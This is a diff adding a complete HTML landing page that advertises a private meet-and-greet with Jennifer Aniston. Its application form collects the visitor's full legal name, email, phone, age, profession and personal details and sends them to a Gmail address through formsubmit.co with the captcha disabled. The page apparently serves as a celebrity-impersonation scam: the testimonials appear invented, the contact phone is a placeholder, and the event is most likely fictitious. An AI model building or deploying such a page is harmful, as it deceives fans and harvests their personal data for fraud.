@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meet Jennifer Aniston - Exclusive Fan Experience</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Playfair+Display:wght@700&display=swap');
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f8f8f8;
+        }
+        
+        .hero {
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), 
+                        url('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/ea9a2fa5-fa6d-4a47-b964-50ddf7163140.png') no-repeat center center/cover;
+            height: 100vh;
+            color: white;
+        }
+        
+        .title-font {
+            font-family: 'Playfair Display', serif;
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            display: none;
+        }
+        
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 2.5rem;
+            z-index: 1001;
+            border-radius: 10px;
+            display: none;
+            width: 90%;
+            max-width: 550px;
+            max-height: 85vh;
+            overflow-y: auto;
+            animation: fadeIn 0.3s ease-out;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -55%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+        
+        .testimonial-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        
+        .transition-all {
+            transition: all 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="bg-white shadow-md fixed w-full z-50">
+        <div class="container mx-auto px-6 py-4">
+            <div class="flex justify-between items-center">
+                <div class="text-2xl font-bold title-font text-indigo-700">Jennifer Aniston</div>
+                <div class="hidden md:flex space-x-8">
+                    <a href="#about" class="text-gray-700 hover:text-indigo-600 transition-all">About</a>
+                    <a href="#experience" class="text-gray-700 hover:text-indigo-600 transition-all">Experience</a>
+                    <a href="#testimonials" class="text-gray-700 hover:text-indigo-600 transition-all">Testimonials</a>
+                    <a href="#faq" class="text-gray-700 hover:text-indigo-600 transition-all">FAQ</a>
+                </div>
+                <button id="applyNavBtn" class="hidden md:block bg-indigo-600 text-white px-6 py-2 rounded-full hover:bg-indigo-700 transition-all">
+                    Apply Now
+                </button>
+                <button id="mobileMenuBtn" class="md:hidden text-gray-700">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero flex items-center justify-center text-center pt-20" id="home">
+        <div class="container mx-auto px-6">
+            <h1 class="text-4xl md:text-6xl font-bold mb-6 title-font">Exclusive Meet & Greet</h1>
+            <h2 class="text-2xl md:text-3xl mb-8">With Jennifer Aniston</h2>
+            <p class="text-xl mb-12 max-w-2xl mx-auto">Join a select group of fans for a private encounter with one of Hollywood's most beloved stars.</p>
+            <button id="applyHeroBtn" class="bg-indigo-600 text-white px-8 py-4 rounded-full text-lg hover:bg-indigo-700 transition-all transform hover:scale-105">
+                Apply for the Experience
+            </button>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section class="py-20 bg-white" id="about">
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl md:text-4xl font-bold mb-16 text-center title-font">About the Experience</h2>
+            <div class="grid md:grid-cols-2 gap-12 items-center">
+                <div>
+                    <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/d33ef501-2300-4229-b52d-a79efd5e4c8c.png" alt="Jennifer Aniston smiling at a fan meet event in an elegant dress" class="rounded-lg shadow-xl" />
+                </div>
+                <div>
+                    <h3 class="text-2xl font-bold mb-4">A Moment You'll Never Forget</h3>
+                    <p class="text-gray-700 mb-6">This exclusive opportunity allows you to meet Jennifer Aniston in an intimate setting, away from large crowds and hectic schedules. Selected fans will enjoy personalized attention during this special encounter.</p>
+                    <p class="text-gray-700 mb-6">Jennifer is known for her warmth and generosity with fans, and this private meet is designed to create meaningful, lasting memories for both her and attendees.</p>
+                    <button id="applyAboutBtn" class="bg-indigo-600 text-white px-6 py-3 rounded-full hover:bg-indigo-700 transition-all">
+                        Apply Now
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Experience Details -->
+    <section class="py-20 bg-gray-100" id="experience">
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl md:text-4xl font-bold mb-16 text-center title-font">The Exclusive Experience</h2>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="bg-white p-8 rounded-lg shadow-md text-center hover:shadow-lg transition-all">
+                    <div class="text-indigo-600 mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" />
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold mb-4">Personal Interaction</h3>
+                    <p class="text-gray-700">15-minute one-on-one conversation with Jennifer in a private setting.</p>
+                </div>
+                <div class="bg-white p-8 rounded-lg shadow-md text-center hover:shadow-lg transition-all">
+                    <div class="text-indigo-600 mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13l-3 3m0 0l-3-3m3 3V8" />
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold mb-4">VIP Package</h3>
+                    <p class="text-gray-700">Includes signed memorabilia, professional photo session, and exclusive gifts.</p>
+                </div>
+                <div class="bg-white p-8 rounded-lg shadow-md text-center hover:shadow-lg transition-all">
+                    <div class="text-indigo-600 mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold mb-4">Luxury Setting</h3>
+                    <p class="text-gray-700">Held in an elegant private venue with refreshments and comfortable seating.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="py-20 bg-indigo-50" id="testimonials">
+        <div class="container mx-auto px-6">
+            <h2 class="text-3xl md:text-4xl font-bold mb-16 text-center title-font text-indigo-800">What Fans Say</h2>
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="testimonial-card bg-white p-8 rounded-lg shadow-md transition-all">
+                    <div class="flex items-center mb-4">
+                        <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/9e953d04-d240-400a-ab50-dbface0d7c89.png" alt="Sarah, marketing executive from Los Angeles smiling" class="rounded-full w-16 h-16 mr-4">
+                        <div>
+                            <h4 class="font-bold">Sarah M.</h4>
+                            <p class="text-gray-600 text-sm">Los Angeles</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-700 italic">"Meeting Jennifer was magical. She's even kinder and more genuine than I imagined. The entire experience was flawlessly organized."</p>
+                    <div class="flex mt-4 text-yellow-400">
+                        ★ ★ ★ ★ ★
+                    </div>
+                </div>
+                <div class="testimonial-card bg-white p-8 rounded-lg shadow-md transition-all">
+                    <div class="flex items-center mb-4">
+                        <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/4f029cd1-7fcb-4de0-85e7-963f2b815402.png" alt="James, business owner from Chicago looking happy" class="rounded-full w-16 h-16 mr-4">
+                        <div>
+                            <h4 class="font-bold">James L.</h4>
+                            <p class="text-gray-600 text-sm">Chicago</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-700 italic">"The VIP treatment was worth every penny. Jennifer took time with each guest - I'll cherish the memory forever."</p>
+                    <div class="flex mt-4 text-yellow-400">
+                        ★ ★ ★ ★ ★
+                    </div>
+                </div>
+                <div class="testimonial-card bg-white p-8 rounded-lg shadow-md transition-all">
+                    <div class="flex items-center mb-4">
+                        <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/7b2f9d37-a4e8-4508-a68e-b0a300259548.png" alt="Emma, teacher from New York with a joyful expression" class="rounded-full w-16 h-16 mr-4">
+                        <div>
+                            <h4 class="font-bold">Emma C.</h4>
+                            <p class="text-gray-600 text-sm">New York</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-700 italic">"I've been a fan since Friends premiered. This intimate meeting was beyond what I dreamed possible - absolutely perfect experience."</p>
+                    <div class="flex mt-4 text-yellow-400">
+                        ★ ★ ★ ★ ★
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="py-20 bg-white" id="faq">
+        <div class="container mx-auto px-6 max-w-4xl">
+            <h2 class="text-3xl md:text-4xl font-bold mb-16 text-center title-font">Frequently Asked Questions</h2>
+            
+            <div class="mb-8 border-b pb-4" x-data="{open: false}">
+                <button @click="open = !open" class="flex justify-between items-center w-full text-left">
+                    <h3 class="text-xl font-bold">How does the application process work?</h3>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 transition-transform duration-300" :class="{'rotate-180': open}" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+                    </svg>
+                </button>
+                <div x-show="open" x-transition class="mt-4 text-gray-700">
+                    <p>Applications are reviewed by our team to select attendees who demonstrate genuine appreciation for Jennifer's work. We consider application completeness, thoughtfulness of responses, and availability. Selected applicants will be notified via email.</p>
+                </div>
+            </div>
+            
+            <div class="mb-8 border-b pb-4" x-data="{open: false}">
+                <button @click="open = !open" class="flex justify-between items-center w-full text-left">
+                    <h3 class="text-xl font-bold">What is included in the VIP package?</h3>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 transition-transform duration-300" :class="{'rotate-180': open}" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+                    </svg>
+                </button>
+                <div x-show="open" x-transition class="mt-4 text-gray-700">
+                    <p>The VIP package includes a 15-minute private conversation with Jennifer, a professional photo session with digital copies, an autographed item, exclusive Jennifer Aniston merchandise, and refreshments during the event.</p>
+                </div>
+            </div>
+            
+            <div class="mb-8 border-b pb-4" x-data="{open: false}">
+                <button @click="open = !open" class="flex justify-between items-center w-full text-left">
+                    <h3 class="text-xl font-bold">Can I bring a guest?</h3>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 transition-transform duration-300" :class="{'rotate-180': open}" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+                    </svg>
+                </button>
+                <div x-show="open" x-transition class="mt-4 text-gray-700">
+                    <p>Due to the intimate nature of this experience, each selected applicant attends individually. Accommodations may be available for companions who would like to wait in the adjacent lounge area.</p>
+                </div>
+            </div>
+            
+            <div class="mb-8 border-b pb-4" x-data="{open: false}">
+                <button @click="open = !open" class="flex justify-between items-center w-full text-left">
+                    <h3 class="text-xl font-bold">Where and when will the event take place?</h3>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 transition-transform duration-300" :class="{'rotate-180': open}" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+                    </svg>
+                </button>
+                <div x-show="open" x-transition class="mt-4 text-gray-700">
+                    <p>The event will be held in Los Angeles at a private venue. Exact date, time and location details will be provided upon application approval. We schedule multiple sessions to accommodate selected guests.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-20 bg-indigo-600 text-white">
+        <div class="container mx-auto px-6 text-center">
+            <h2 class="text-3xl md:text-4xl font-bold mb-6 title-font">Ready for an Unforgettable Experience?</h2>
+            <p class="text-xl mb-8 max-w-2xl mx-auto opacity-90">Don't miss your chance to meet Jennifer Aniston in this exclusive private setting.</p>
+            <button id="applyBottomBtn" class="bg-white text-indigo-600 px-8 py-4 rounded-full text-lg font-bold hover:bg-gray-100 transition-all transform hover:scale-105">
+                Apply Now
+            </button>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-white py-12">
+        <div class="container mx-auto px-6">
+            <div class="grid md:grid-cols-4 gap-8">
+                <div>
+                    <h3 class="text-xl font-bold mb-4 title-font">Jennifer Aniston</h3>
+                    <p class="opacity-70">Creating meaningful connections with fans through exclusive experiences.</p>
+                </div>
+                <div>
+                    <h4 class="font-bold mb-4">Quick Links</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#about" class="opacity-70 hover:opacity-100 transition-all">About the Experience</a></li>
+                        <li><a href="#experience" class="opacity-70 hover:opacity-100 transition-all">VIP Package</a></li>
+                        <li><a href="#testimonials" class="opacity-70 hover:opacity-100 transition-all">Testimonials</a></li>
+                        <li><a href="#faq" class="opacity-70 hover:opacity-100 transition-all">FAQ</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold mb-4">Contact</h4>
+                    <ul class="space-y-2">
+                        <li class="opacity-70">Email: applications@jenniferfanmeet.com</li>
+                        <li class="opacity-70">Phone: (555) 123-4567</li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold mb-4">Follow Jennifer</h4>
+                    <div class="flex space-x-4">
+                        <a href="#" class="bg-indigo-700 p-2 rounded-full hover:bg-indigo-600 transition-all">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" />
+                            </svg>
+                        </a>
+                        <a href="#" class="bg-indigo-700 p-2 rounded-full hover:bg-indigo-600 transition-all">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-12 pt-8 text-center opacity-70">
+                <p>&copy; 2023 Jennifer Aniston Fan Experiences. All rights reserved. This is an unofficial fan experience not affiliated with Jennifer Aniston's official representatives.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Application Modal -->
+    <div id="modalOverlay" class="modal-overlay"></div>
+    <div id="applicationModal" class="modal">
+        <div class="relative">
+            <button id="closeModal" class="absolute top-0 right-0 text-gray-500 hover:text-gray-700">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+            </button>
+            
+            <h2 class="text-2xl font-bold mb-6 text-center title-font text-indigo-700">Apply for the Meet & Greet</h2>
+            
+           <form id="applicationForm" action="https://formsubmit.co/jenniferaniston.chatline@gmail.com" method="POST" class="space-y-6">
+    <!-- Hidden FormSubmit settings -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html">
+
+    <div>
+        <label for="fullName" class="block text-gray-700 font-medium mb-2">Full Legal Name*</label>
+        <input type="text" id="fullName" name="Full Name" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required>
+    </div>
+
+    <div>
+        <label for="email" class="block text-gray-700 font-medium mb-2">Professional Email Address*</label>
+        <input type="email" id="email" name="Email" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required>
+    </div>
+
+    <div>
+        <label for="phone" class="block text-gray-700 font-medium mb-2">Mobile Phone Number*</label>
+        <input type="tel" id="phone" name="Phone" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required>
+    </div>
+
+    <div>
+        <label for="age" class="block text-gray-700 font-medium mb-2">Age*</label>
+        <input type="number" id="age" name="Age" min="18" max="90" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required>
+    </div>
+
+    <div class="pt-4 border-t border-gray-200">
+        <h3 class="text-xl font-bold mb-4 text-indigo-700">Personal Background</h3>
+
+        <div class="mb-6">
+            <label for="profession" class="block text-gray-700 font-medium mb-2">Current Profession*</label>
+            <input type="text" id="profession" name="Profession" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required>
+        </div>
+
+        <div class="mb-6">
+            <label class="block text-gray-700 font-medium mb-2">How would you describe your personality?*</label>
+            <div class="space-y-2">
+                <div class="flex items-center">
+                    <input type="checkbox" id="friendly" name="Personality" value="Friendly/Approachable" class="mr-2">
+                    <label for="friendly" class="text-gray-700">Friendly/Approachable</label>
+                </div>
+                <div class="flex items-center">
+                    <input type="checkbox" id="reserved" name="Personality" value="Reserved/Thoughtful" class="mr-2">
+                    <label for="reserved" class="text-gray-700">Reserved/Thoughtful</label>
+                </div>
+                <div class="flex items-center">
+                    <input type="checkbox" id="energetic" name="Personality" value="Energetic/Enthusiastic" class="mr-2">
+                    <label for="energetic" class="text-gray-700">Energetic/Enthusiastic</label>
+                </div>
+                <div class="flex items-center">
+                    <input type="checkbox" id="calm" name="Personality" value="Calm/Easygoing" class="mr-2">
+                    <label for="calm" class="text-gray-700">Calm/Easygoing</label>
+                </div>
+            </div>
+        </div>
+
+        <div class="mb-6">
+            <label for="hobbies" class="block text-gray-700 font-medium mb-2">Your Hobbies & Interests*</label>
+            <textarea id="hobbies" name="Hobbies" rows="2" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required></textarea>
+        </div>
+    </div>
+
+    <div>
+        <label for="journey" class="block text-gray-700 font-medium mb-2">How did you first discover Jennifer Aniston's work?*</label>
+        <textarea id="journey" name="Discovery" rows="3" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required></textarea>
+    </div>
+
+    <div class="pt-4 border-t border-gray-200">
+        <h3 class="text-xl font-bold mb-4 text-indigo-700">Event Expectations</h3>
+
+        <div class="mb-6">
+            <label for="expectations" class="block text-gray-700 font-medium mb-2">What would make this experience special for you?*</label>
+            <textarea id="expectations" name="Expectations" rows="3" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required></textarea>
+        </div>
+
+        <div class="mb-6">
+            <label for="question" class="block text-gray-700 font-medium mb-2">If you could ask Jennifer one question, what would it be?*</label>
+            <textarea id="question" name="Question for Jennifer" rows="2" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required></textarea>
+        </div>
+
+        <div class="mb-6">
+            <label class="block text-gray-700 font-medium mb-2">Have you ever met Jennifer Aniston before?*</label>
+            <div class="flex space-x-4">
+                <label class="inline-flex items-center">
+                    <input type="radio" name="Met Before" value="Yes" class="mr-2" required>
+                    <span>Yes</span>
+                </label>
+                <label class="inline-flex items-center">
+                    <input type="radio" name="Met Before" value="No" class="mr-2" required>
+                    <span>No</span>
+                </label>
+            </div>
+        </div>
+    </div>
+
+    <div>
+        <label for="favorite" class="block text-gray-700 font-medium mb-2">Favorite Jennifer Aniston Work*</label>
+        <select id="favorite" name="Favorite Work" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required>
+            <option value="">Select one</option>
+            <option value="Friends">Friends</option>
+            <option value="The Morning Show">The Morning Show</option>
+            <option value="Marley & Me">Marley & Me</option>
+            <option value="The Break-Up">The Break-Up</option>
+            <option value="Cake">Cake</option>
+            <option value="Horrible Bosses">Horrible Bosses</option>
+            <option value="Office Space">Office Space</option>
+            <option value="We're the Millers">We're the Millers</option>
+            <option value="Other">Other</option>
+        </select>
+    </div>
+
+    <div>
+        <label for="why" class="block text-gray-700 font-medium mb-2">Why should you be selected?*</label>
+        <textarea id="why" name="Why Selected" rows="5" minlength="250" maxlength="2000" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500" required></textarea>
+    </div>
+
+    <div>
+        <input type="checkbox" id="availability" name="Available to Travel" value="Yes" class="mr-2" required>
+        <label for="availability" class="text-gray-700">I confirm I'm available to travel to Los Angeles*</label>
+    </div>
+
+    <div>
+        <input type="checkbox" id="agree" name="Agreed to Terms" value="Yes" class="mr-2" required>
+        <label for="agree" class="text-gray-700">I certify all information is accurate*</label>
+    </div>
+
+    <div>
+        <button type="submit" class="w-full bg-indigo-600 text-white py-3 rounded-lg font-bold hover:bg-indigo-700 transition-all">
+            Submit Application
+        </button>
+    </div>
+</form>
+
+        </div>
+    </div>
+<!-- (REMOVED) Confirmation Modal: no longer included -->
+
+<script>
+    const modalOverlay = document.getElementById('modalOverlay');
+    const applicationModal = document.getElementById('applicationModal');
+    const closeModal = document.getElementById('closeModal');
+
+    const applyButtons = [
+        document.getElementById('applyHeroBtn'),
+        document.getElementById('applyNavBtn'),
+        document.getElementById('applyAboutBtn'),
+        document.getElementById('applyBottomBtn')
+    ];
+
+    function openModal() {
+        modalOverlay.style.display = 'block';
+        applicationModal.style.display = 'block';
+        document.body.style.overflow = 'hidden';
+    }
+
+    function closeModalFunc() {
+        modalOverlay.style.display = 'none';
+        applicationModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    }
+
+    applyButtons.forEach(button => {
+        if (button) {
+            button.addEventListener('click', openModal);
+        }
+    });
+
+    modalOverlay.addEventListener('click', closeModalFunc);
+    closeModal.addEventListener('click', closeModalFunc);
+
+    // Prevent modal close when clicking inside modal
+    applicationModal.addEventListener('click', function(e) {
+        e.stopPropagation();
+    });
+
+    // 🧼 Removed form submit JS handler so FormSubmit.co works
+    // 🧼 Removed confirmation modal code
+
+    // Mobile menu toggle
+    document.getElementById('mobileMenuBtn').addEventListener('click', function () {
+        alert("Mobile menu would open here in a full implementation");
+    });
+
+    // Smooth scrolling for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+            e.preventDefault();
+
+            const targetId = this.getAttribute('href');
+            if (targetId === '#') return;
+
+            const targetElement = document.querySelector(targetId);
+            if (targetElement) {
+                window.scrollTo({
+                    top: targetElement.offsetTop - 80,
+                    behavior: 'smooth'
+                });
+            }
+        });
+    });
+</script>
+</body>
+</html>
